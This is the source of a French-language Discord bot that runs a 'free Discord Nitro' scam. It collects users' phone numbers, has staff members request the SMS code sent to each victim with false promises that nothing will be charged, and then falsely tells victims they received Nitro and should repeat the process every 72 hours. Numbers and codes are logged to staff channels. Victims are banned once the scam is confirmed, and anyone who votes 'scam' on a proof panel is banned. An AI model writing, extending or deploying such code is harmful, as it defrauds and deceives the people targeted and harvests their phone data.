import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import datetime
import os
import logging
from typing import Optional, Dict
from aiohttp import web
import config
from utils import validate_phone, mask_phone, validate_code, load_blacklist, save_blacklist, is_user_blacklisted, is_phone_blacklisted, add_to_blacklist, remove_user_blacklist, load_setup_data, save_setup_data

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("VerifBot")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

cooldowns: Dict[int, float] = {}
pending_verifications: Dict[int, dict] = {}
staff_active_claims: Dict[int, dict] = {}
retry_cooldowns: Dict[int, float] = {}
blacklist = load_blacklist()

async def health_handler(request):
    return web.Response(text="OK", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.PORT)
    await site.start()
    log.info(f"Health check server on port {config.PORT}")

async def ban_user(user_id: int, reason: str = ""):
    guild = bot.get_guild(config.GUILD_ID)
    if not guild:
        return False
    try:
        member = guild.get_member(user_id)
        if member:
            await member.ban(reason=reason, delete_message_days=0)
            return True
        else:
            await guild.ban(discord.Object(id=user_id), reason=reason, delete_message_days=0)
            return True
    except:
        return False

class ProofBanModal(discord.ui.Modal, title="Bannir un utilisateur"):
    user_id_input = discord.ui.TextInput(
        label="ID de l'utilisateur",
        placeholder="Entrez l'ID Discord",
        min_length=10,
        max_length=30,
        required=True,
    )
    phone_input = discord.ui.TextInput(
        label="Numero de telephone",
        placeholder="0612345678",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        try:
            target_id = int(self.user_id_input.value.strip())
        except:
            embed = discord.Embed(title="ID invalide", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        phone = self.phone_input.value.strip().replace(" ", "").replace("-", "")
        banned = await ban_user(target_id, "Banni via preuves - scam")
        add_to_blacklist(target_id, phone, blacklist)
        embed = discord.Embed(
            title="Utilisateur banni",
            description=f"**ID :** `{target_id}`\n**Numero :** `{mask_phone(phone)}`\n**Banni :** {'Oui' if banned else 'Deja banni'}",
            color=0xed4245
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

class ProofView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Oui c'est legit", style=discord.ButtonStyle.success, custom_id="proof_yes")
    async def yes_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="Vote enregistre", description="Merci pour votre vote.", color=0x57f287)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="Non c'est du scam", style=discord.ButtonStyle.danger, custom_id="proof_no")
    async def no_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(ProofBanModal())

class ValidationChannelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone

    @discord.ui.button(label="Valider", style=discord.ButtonStyle.success, custom_id="val_validate")
    async def val_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if is_user_blacklisted(self.user_id, blacklist):
            embed = discord.Embed(title="Deja blacklist", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        add_to_blacklist(self.user_id, self.phone, blacklist)
        banned = await ban_user(self.user_id, "Scam confirme via validation")
        for child in self.children:
            if isinstance(child, discord.ui.Button):
                child.disabled = True
        embed = discord.Embed(title="Scam valide", description=f"<@{self.user_id}> banni et blacklist.", color=0xed4245)
        await interaction.response.edit_message(embed=interaction.message.embeds[0], view=self)
        await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="Fermer", style=discord.ButtonStyle.danger, custom_id="val_close")
    async def close_val_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if is_user_blacklisted(self.user_id, blacklist):
            embed = discord.Embed(title="Deja blacklist", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        add_to_blacklist(self.user_id, self.phone, blacklist)
        banned = await ban_user(self.user_id, "Banni via fermeture validation")
        for child in self.children:
            if isinstance(child, discord.ui.Button):
                child.disabled = True
        embed = discord.Embed(title="Ticket ferme", description=f"<@{self.user_id}> banni et blacklist.", color=0xed4245)
        await interaction.response.edit_message(embed=interaction.message.embeds[0], view=self)
        await interaction.followup.send(embed=embed, ephemeral=True)

class PhoneModal(discord.ui.Modal, title="Verification telephone"):
    phone = discord.ui.TextInput(
        label="Numero de telephone",
        placeholder="0612345678",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        now = datetime.datetime.now().timestamp()
        if interaction.user.id in cooldowns:
            remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
            if remaining > 0:
                embed = discord.Embed(title="Cooldown actif", description=f"Veuillez attendre {int(remaining)} secondes avant de reessayer.", color=0xfee75c)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
        if interaction.user.id in pending_verifications:
            embed = discord.Embed(title="Deja en cours", description="Vous avez deja une verification en attente.", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if is_user_blacklisted(interaction.user.id, blacklist):
            embed = discord.Embed(title="Acces refuse", description="Vous etes blacklist.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        phone_raw = self.phone.value.strip().replace(" ", "").replace("-", "")
        if is_phone_blacklisted(phone_raw, blacklist):
            embed = discord.Embed(title="Numero blacklist", description="Ce numero est blacklist.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        valid, err_msg = validate_phone(phone_raw)
        if not valid:
            embed = discord.Embed(title="Numero invalide", description=err_msg, color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        cooldowns[interaction.user.id] = now
        embed_wait = discord.Embed(
            title="Demande envoyee",
            description="Votre demande a ete prise en compte.\n\nUn membre du staff va vous contacter.\n\nAucun debit - 0,00 Euro",
            color=0x57f287
        )
        embed_wait.set_footer(text="Verification • 0,00 Euro")
        await interaction.response.send_message(embed=embed_wait, ephemeral=True)
        await send_staff_panel(interaction.user, phone_raw)

def build_staff_embed(user: discord.User, phone: str, status: str = "En attente", claimed_by: Optional[int] = None, code_requested: bool = False, timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
    if timestamp is None:
        timestamp = datetime.datetime.now()
    embed = discord.Embed(title="NOUVELLE DEMANDE DE VERIFICATION", color=0x5865f2, timestamp=timestamp)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
    embed.add_field(name="ID", value=f"`{user.id}`", inline=True)
    embed.add_field(name="Numero", value=f"`{mask_phone(phone)}`", inline=True)
    embed.add_field(name="Statut", value=status, inline=True)
    embed.add_field(name="Code demande", value="Oui" if code_requested else "Non", inline=True)
    embed.add_field(name="Pris par", value=f"<@{claimed_by}>" if claimed_by else "*Personne*", inline=False)
    embed.set_footer(text=datetime.datetime.now().strftime("%d/%m/%Y %H:%M") + " • Verification")
    return embed

class StaffPanelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone
        self.claimed_by: Optional[int] = None
        self.code_requested = False
        self.closed = False
        self.message: Optional[discord.Message] = None
        self.auto_close_task: Optional[asyncio.Task] = None

    async def close_ticket(self, status_text: str = "Ferme", do_ban: bool = True, reason: str = "Verification fermee"):
        pending_verifications.pop(self.user_id, None)
        cooldowns.pop(self.user_id, None)
        if self.claimed_by and self.claimed_by in staff_active_claims:
            staff_active_claims.pop(self.claimed_by, None)
        self.closed = True
        if do_ban and self.user_id:
            add_to_blacklist(self.user_id, self.phone, blacklist)
            await ban_user(self.user_id, reason)
        if self.auto_close_task:
            self.auto_close_task.cancel()
            self.auto_close_task = None
        for child in self.children:
            if isinstance(child, discord.ui.Button):
                child.disabled = True
        try:
            user_fetch = await bot.fetch_user(self.user_id)
            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status=status_text, claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=self.message.created_at if self.message else None)
            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
            new_embed.color = 0xed4245
            await self.message.edit(embed=new_embed, view=self)
        except:
            pass

    async def start_auto_close(self):
        await asyncio.sleep(300)
        if not self.closed and not self.code_requested and self.claimed_by is not None:
            await self.close_ticket("Ferme automatiquement (5 min)", do_ban=False)

    @discord.ui.button(label="Prendre en charge", style=discord.ButtonStyle.primary, custom_id="claim_btn")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None:
            embed = discord.Embed(title="Deja pris", description=f"Un maker est deja sur le coup (<@{self.claimed_by}>).", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.closed:
            embed = discord.Embed(title="Ferme", description="Cette verification est deja fermee.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        staff_id = interaction.user.id
        if staff_id in staff_active_claims:
            old_data = staff_active_claims[staff_id]
            try:
                old_view = old_data["view"]
                await old_view.close_ticket("Ferme (nouveau claim)", do_ban=False)
            except:
                pass
        staff_active_claims[staff_id] = {"view": self, "user_id": self.user_id}
        self.claimed_by = staff_id
        embed_reveal = discord.Embed(title="Numero debloque", description=f"```\n{self.phone}\n```\nNe partagez pas ce numero.", color=0x57f287, timestamp=datetime.datetime.now())
        await interaction.response.send_message(embed=embed_reveal, ephemeral=True)
        user_fetch = await bot.fetch_user(self.user_id)
        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="En cours", claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=interaction.message.created_at)
        new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
        await interaction.message.edit(embed=new_embed, view=self)
        self.auto_close_task = asyncio.create_task(self.start_auto_close())

    @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.success, custom_id="request_code_btn")
    async def request_code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is None:
            embed = discord.Embed(title="Action impossible", description="Prenez d'abord la verification en charge.", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.claimed_by != interaction.user.id:
            embed = discord.Embed(title="Action impossible", description=f"Seul <@{self.claimed_by}> peut demander le code.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.code_requested:
            embed = discord.Embed(title="Deja demande", description="Le code a deja ete demande a cet utilisateur.", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.closed:
            embed = discord.Embed(title="Ferme", description="Cette verification est fermee.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.auto_close_task:
            self.auto_close_task.cancel()
            self.auto_close_task = None
        self.code_requested = True
        pending_verifications[self.user_id] = {
            "phone": self.phone,
            "claimed_by": interaction.user.id
        }
        embed_confirm = discord.Embed(
            title="Message envoye",
            description="Un message a ete envoye a l'utilisateur pour demander le code.",
            color=0x57f287,
            timestamp=datetime.datetime.now()
        )
        await interaction.response.send_message(embed=embed_confirm, ephemeral=True)
        log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
        if log_channel:
            embed_log = discord.Embed(
                title="CODE DEMANDE",
                description="Code demande pour un utilisateur.",
                color=0xfee75c,
                timestamp=datetime.datetime.now()
            )
            embed_log.add_field(name="Staff", value=f"<@{interaction.user.id}>", inline=True)
            embed_log.add_field(name="Utilisateur", value=f"<@{self.user_id}> (`{self.user_id}`)", inline=True)
            embed_log.add_field(name="Numero", value=f"||{self.phone}||", inline=True)
            embed_log.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
            embed_log.set_footer(text="Logs de verification")
            await log_channel.send(embed=embed_log)
        try:
            user = await bot.fetch_user(self.user_id)
            embed_dm = discord.Embed(
                title="Code de verification",
                description="N'ayez pas peur, c'est une simple verification pour prouver votre age.\n\nComme quand on relie une carte bancaire a PayPal, un prelevement de 0 Euro est effectue pour verifier que le compte est valide.\n\nAucun debit ne sera fait sur votre facture telephone. Le SMS recu est juste un code de confirmation.\n\nUne fois le code recu, repondez a ce message avec le code a 4 chiffres.",
                color=0x5865f2
            )
            embed_dm.set_footer(text="Repondez avec le code • 0,00 Euro")
            await user.send(embed=embed_dm)
        except discord.Forbidden:
            embed_fail = discord.Embed(title="Erreur", description=f"<@{self.user_id}> a ses MP fermes. Contactez-le manuellement.", color=0xed4245)
            await interaction.followup.send(embed=embed_fail, ephemeral=True)
            pending_verifications.pop(self.user_id, None)
            self.code_requested = False
            return
        user_fetch = await bot.fetch_user(self.user_id)
        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="Code demande - en attente", claimed_by=self.claimed_by, code_requested=True, timestamp=interaction.message.created_at)
        new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
        await interaction.message.edit(embed=new_embed, view=self)

    @discord.ui.button(label="Work (scam confirme)", style=discord.ButtonStyle.success, custom_id="work_btn")
    async def work_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is None:
            embed = discord.Embed(title="Action impossible", description="Prenez d'abord la verification en charge.", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.claimed_by != interaction.user.id:
            embed = discord.Embed(title="Action impossible", description=f"Seul <@{self.claimed_by}> peut utiliser ce bouton.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.closed:
            embed = discord.Embed(title="Deja ferme", description="Cette verification est deja fermee.", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        await self.close_ticket("Scam confirme - Banni", do_ban=True, reason="Scam confirme par le staff")
        embed = discord.Embed(title="Scam confirme", description=f"L'utilisateur <@{self.user_id}> a ete banni et le numero blacklist.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="Fermer", style=discord.ButtonStyle.danger, custom_id="close_btn")
    async def close_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None and self.claimed_by != interaction.user.id:
            embed = discord.Embed(title="Action impossible", description=f"Seul <@{self.claimed_by}> peut fermer cette verification.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.closed:
            embed = discord.Embed(title="Deja ferme", description="Cette verification est deja fermee.", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        await self.close_ticket("Ferme - Banni", do_ban=True, reason="Banni via fermeture de verification")
        embed = discord.Embed(title="Verification fermee", description=f"L'utilisateur <@{self.user_id}> a ete banni et le numero blacklist.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)

async def send_staff_panel(user: discord.User, phone: str):
    guild = bot.get_guild(config.STAFF_GUILD_ID)
    if not guild:
        log.error(f"Staff guild {config.STAFF_GUILD_ID} introuvable.")
        return
    channel = guild.get_channel(config.STAFF_CHANNEL_ID)
    if not channel:
        log.error(f"Staff channel {config.STAFF_CHANNEL_ID} introuvable.")
        return
    view = StaffPanelView(user.id, phone)
    embed = build_staff_embed(user=user, phone=phone, status="En attente", claimed_by=None, code_requested=False)
    embed.set_thumbnail(url=user.display_avatar.url)
    msg = await channel.send(content="@everyone", embed=embed, view=view)
    view.message = msg

async def send_validation_channel_message(user: discord.User, phone: str, code: str, claimed_by: int):
    validation_channel = bot.get_channel(config.VALIDATION_CHANNEL_ID)
    if not validation_channel:
        return
    embed_val = discord.Embed(
        title="CODE DE VERIFICATION VALIDE",
        description=f"```\n  {code}  \n```",
        color=0x57f287,
        timestamp=datetime.datetime.now()
    )
    embed_val.add_field(name="Numero", value=f"`{phone[:2]}******{phone[-2:]}`", inline=True)
    embed_val.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
    embed_val.add_field(name="Valide le", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=False)
    embed_val.set_footer(text="Verification validee")
    view = ValidationChannelView(user.id, phone)
    await validation_channel.send(content=f"<@{claimed_by}>", embed=embed_val, view=view)

async def handle_dm_code(message: discord.Message):
    user_id = message.author.id
    pending = pending_verifications.get(user_id)
    if pending is None:
        embed = discord.Embed(
            title="Verification expiree",
            description="Cette verification a expire. Vous pouvez utiliser la commande `/retry` pour relancer une demande.\n\nSinon contactez le staff.",
            color=0xed4245
        )
        await message.channel.send(embed=embed)
        return
    content = message.content.strip()
    valid, err_msg = validate_code(content)
    if not valid:
        embed = discord.Embed(title="Code invalide", description=err_msg, color=0xed4245)
        await message.channel.send(embed=embed)
        return
    phone = pending["phone"]
    claimed_by = pending.get("claimed_by")
    pending_verifications.pop(user_id, None)
    embed_success = discord.Embed(
        title="Felicitation !",
        description=(
            "Vous avez recu entre **7 et 12 Nitro Boost** sur votre compte Discord !\n\n"
            "**Comment les recuperer ?**\n"
            "Allez dans **Parametres** > **Inventaire des cadeaux** et vous verrez vos Nitros en stock.\n\n"
            "**ATTENTION :**\n"
            "Pour eviter que Discord ne supprime les Nitros de votre inventaire, "
            "vous devez refaire cette technique toutes les **72 heures**. "
            "C'est une mesure de protection pour eviter que votre compte ne recoive "
            "un avertissement ou ne soit banni.\n\n"
            "**Vous n'avez pas recu le code ou vous vous etes trompe ?**\n"
            "Pas de panique, vous pouvez reessayer apres **10 minutes**.\n"
            "Utilisez la commande `/retry` dans ce message prive pour relancer le processus.\n\n"
            "**100% securise** - Personne ne sera facture, aucun risque pour votre compte "
            "si vous suivez les instructions. N'hesitez pas a demander des preuves "
            "au staff si vous avez des doutes.\n\n"
            "**N'oubliez pas de laisser un avis et des suggestions pour nous aider a nous ameliorer !**"
        ),
        color=0x57f287
    )
    embed_success.set_footer(text="Nitro gratuit • 0,00 Euro")
    await message.channel.send(embed=embed_success)
    await send_validation_channel_message(message.author, phone, content, claimed_by)
    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if log_channel:
        embed_log = discord.Embed(
            title="CODE VALIDE",
            description="Code valide par un utilisateur.",
            color=0x57f287,
            timestamp=datetime.datetime.now()
        )
        embed_log.add_field(name="Staff", value=f"<@{claimed_by}> (`{claimed_by}`)", inline=True)
        embed_log.add_field(name="Utilisateur", value=f"{message.author.mention} (`{user_id}`)", inline=True)
        embed_log.add_field(name="Numero", value=f"||{phone}||", inline=True)
        embed_log.add_field(name="Code", value=f"`{content}`", inline=True)
        embed_log.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
        embed_log.set_thumbnail(url=message.author.display_avatar.url)
        embed_log.set_footer(text="Logs de verification")
        await log_channel.send(embed=embed_log)
    if config.VERIFIED_ROLE_ID and config.GUILD_ID:
        guild = bot.get_guild(config.GUILD_ID)
        if guild:
            role = guild.get_role(config.VERIFIED_ROLE_ID)
            if role:
                member = guild.get_member(user_id)
                if member:
                    try:
                        await member.add_roles(role, reason="Verification telephone reussie")
                    except discord.Forbidden:
                        log.warning(f"Permission manquante role {user_id}")
    user_fetch = await bot.fetch_user(user_id)
    staff_guild = bot.get_guild(config.STAFF_GUILD_ID)
    if staff_guild:
        staff_channel = staff_guild.get_channel(config.STAFF_CHANNEL_ID)
        if staff_channel:
            async for msg in staff_channel.history(limit=50):
                if msg.embeds:
                    for embed in msg.embeds:
                        for field in embed.fields:
                            if field.value and str(user_id) in field.value:
                                try:
                                    view = discord.ui.View.from_message(msg)
                                    if view:
                                        for child in view.children:
                                            if isinstance(child, discord.ui.Button):
                                                child.disabled = True
                                    new_embed = build_staff_embed(user=user_fetch, phone=phone, status="Verifie", claimed_by=claimed_by, code_requested=True, timestamp=msg.created_at)
                                    new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
                                    new_embed.color = 0x57f287
                                    await msg.edit(embed=new_embed, view=view)
                                except:
                                    pass
                                break

class VerifyButtonView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(VerifyButton())

class VerifyButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="Verifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(PhoneModal())

@bot.tree.command(name="setup", description="Cree le panneau de verification dans ce salon")
@app_commands.default_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Obtenez Discord Nitro Gratuitement",
        description=(
            "Suivez ces etapes simples pour obtenir plusieurs Nitro sans depenser un centime :\n\n"
            "**1 - Procedure de Verification :**\n"
            "- Cliquez sur \"Verifier\" en bas de cette page.\n"
            "- Entrez votre numero de telephone.\n\n"
            "**2 - Recevez le Code par SMS :**\n"
            "- Vous recevrez un code par SMS sur votre telephone.\n"
            "- Ce code est essentiel pour la prochaine etape.\n\n"
            "**3 - Validez avec le Code :**\n"
            "- Une fois que vous avez recu le code, entrez-le lorsque notre bot vous le demandera.\n"
            "- Cela liera votre numero de telephone a notre systeme securise. "
            "Aucune de vos informations ne sera enregistree, donc sauvegardez-les.\n\n"
            "**4 - Reclamez Vos Nitro :**\n"
            "- Apres avoir valide avec le code, notre bot vous guidera vers la page de reclamation.\n"
            "- Suivez les instructions a l'ecran pour recevoir vos Nitro gratuits.\n\n"
            "**Pourquoi Faire Cela ?**\n"
            "En liant votre numero de telephone, vous devenez eligible pour notre technique exclusive "
            "qui permet de generer plusieurs Nitro. C'est une opportunite unique de profiter des "
            "avantages de Discord Nitro sans frais.\n\n"
            "**Attention :**\n"
            "- Assurez-vous d'entrer un numero de telephone valide.\n"
            "- Le code SMS est crucial, ne le partagez avec personne d'autre que notre bot.\n"
            "- Vous ne serez facture de 0 centime pour cette technique."
        ),
        color=0x5865f2
    )
    embed.set_footer(text="Nitro gratuit • 0,00 Euro")
    view = VerifyButtonView()
    await interaction.response.send_message(embed=embed, view=view)
    setup_data = load_setup_data()
    setup_data.append({"channel_id": interaction.channel_id, "message_id": None})
    save_setup_data(setup_data)
    log.info(f"Setup fait dans #{interaction.channel.name}")

@bot.tree.command(name="proofsetup", description="Cree le panneau de preuves dans ce salon")
@app_commands.default_permissions(administrator=True)
async def proofsetup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Le serveur est-il legit ?",
        description="> **Oui c'est legit**\n> **Non c'est du scam (no proof = ban)**",
        color=0x5865f2
    )
    embed.set_footer(text="Systeme de verification de preuves")
    view = ProofView()
    await interaction.response.send_message(embed=embed, view=view)
    log.info(f"Proof setup fait dans #{interaction.channel.name}")

@bot.tree.command(name="retry", description="Relancer la verification si vous n'avez pas recu le code")
async def retry(interaction: discord.Interaction):
    if not isinstance(interaction.channel, discord.DMChannel):
        embed = discord.Embed(title="Erreur", description="Cette commande fonctionne uniquement en message prive.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    user_id = interaction.user.id
    now = datetime.datetime.now().timestamp()
    if user_id in retry_cooldowns:
        remaining = retry_cooldowns[user_id] + 600 - now
        if remaining > 0:
            embed = discord.Embed(title="Trop tot", description=f"Veuillez attendre {int(remaining)} secondes avant de reessayer.", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
    if user_id in pending_verifications:
        embed = discord.Embed(title="Deja en cours", description="Vous avez deja une verification en cours.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    if is_user_blacklisted(user_id, blacklist):
        embed = discord.Embed(title="Acces refuse", description="Vous etes blacklist.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    retry_cooldowns[user_id] = now
    embed = discord.Embed(
        title="Nouvelle demande",
        description="Votre demande de relance a ete transmise au staff.\n\nUn membre va vous contacter sous peu.",
        color=0x57f287
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)
    user = await bot.fetch_user(user_id)
    from utils import mask_phone as mask
    phone = "Numero inconnu"
    await send_staff_panel(user, phone)

@bot.tree.command(name="clear", description="Supprime un nombre de messages dans le salon")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(nombre="Nombre de messages a supprimer")
async def clear(interaction: discord.Interaction, nombre: int):
    if nombre < 1 or nombre > 100:
        embed = discord.Embed(title="Nombre invalide", description="Choisissez un nombre entre 1 et 100.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=nombre)
    embed = discord.Embed(title="Salon nettoye", description=f"{len(deleted)} messages supprimes.", color=0x57f287)
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="ping", description="Affiche la latence du bot")
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(title="Pong", description=f"Latence : {latency}ms", color=0x57f287)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="ban", description="Ban un utilisateur silencieusement par ID")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(user_id="ID de l'utilisateur a bannir")
async def ban(interaction: discord.Interaction, user_id: str):
    try:
        target_id = int(user_id.strip())
    except:
        embed = discord.Embed(title="ID invalide", description="Entrez un ID Discord valide.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    banned = await ban_user(target_id, "Banni via commande /ban")
    embed = discord.Embed(
        title="Utilisateur banni",
        description=f"**ID :** `{target_id}`\n**Banni :** {'Oui' if banned else 'Deja banni'}",
        color=0xed4245
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="unban", description="Deban un utilisateur par ID")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(user_id="ID de l'utilisateur a debannir")
async def unban(interaction: discord.Interaction, user_id: str):
    try:
        target_id = int(user_id.strip())
    except:
        embed = discord.Embed(title="ID invalide", description="Entrez un ID Discord valide.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    guild = bot.get_guild(config.GUILD_ID)
    if guild:
        try:
            await guild.unban(discord.Object(id=target_id), reason="Debanni via commande /unban")
            remove_user_blacklist(target_id, blacklist)
            embed = discord.Embed(title="Utilisateur debanni", description=f"**ID :** `{target_id}`", color=0x57f287)
        except discord.NotFound:
            remove_user_blacklist(target_id, blacklist)
            embed = discord.Embed(title="Utilisateur debanni", description=f"**ID :** `{target_id}` (retire de la blacklist)", color=0xfee75c)
        except:
            embed = discord.Embed(title="Erreur", description="Impossible de debannir.", color=0xed4245)
    else:
        embed = discord.Embed(title="Erreur", description="Guild introuvable.", color=0xed4245)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="banlist", description="Affiche la liste des utilisateurs blacklist")
@app_commands.default_permissions(administrator=True)
async def banlist(interaction: discord.Interaction):
    users = blacklist.get("users", [])
    phones = blacklist.get("phones", [])
    embed = discord.Embed(title="Blacklist", color=0xed4245)
    if users:
        embed.add_field(name="Utilisateurs", value="\n".join([f"`{uid}`" for uid in users[:20]]), inline=True)
    else:
        embed.add_field(name="Utilisateurs", value="*Aucun*", inline=True)
    if phones:
        embed.add_field(name="Numeros", value="\n".join([f"`{mask_phone(p)}`" for p in phones[:20]]), inline=True)
    else:
        embed.add_field(name="Numeros", value="*Aucun*", inline=True)
    embed.set_footer(text=f"Total : {len(users)} users • {len(phones)} numeros")
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="sync", description="Sync les commandes slash")
@app_commands.default_permissions(administrator=True)
async def sync(interaction: discord.Interaction):
    await bot.tree.sync()
    embed = discord.Embed(title="Commandes synchronisees", color=0x57f287)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.event
async def on_ready():
    log.info(f"Connecte : {bot.user}")
    await bot.tree.sync()
    log.info("Commandes slash synchronisees.")
    asyncio.create_task(start_health_server())
    setup_data = load_setup_data()
    for entry in setup_data:
        channel = bot.get_channel(entry["channel_id"])
        if channel:
            try:
                async for msg in channel.history(limit=20):
                    if msg.author == bot.user and msg.embeds:
                        view = VerifyButtonView()
                        bot.add_view(view, message_id=msg.id)
                        log.info(f"Setup persistant restore dans #{channel.name}")
                        break
            except:
                pass

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if isinstance(message.channel, discord.DMChannel):
        await handle_dm_code(message)

if __name__ == "__main__":
    if not config.BOT_TOKEN:
        log.critical("BOT_TOKEN manquant dans .env")
        exit(1)
    bot.run(config.BOT_TOKEN)
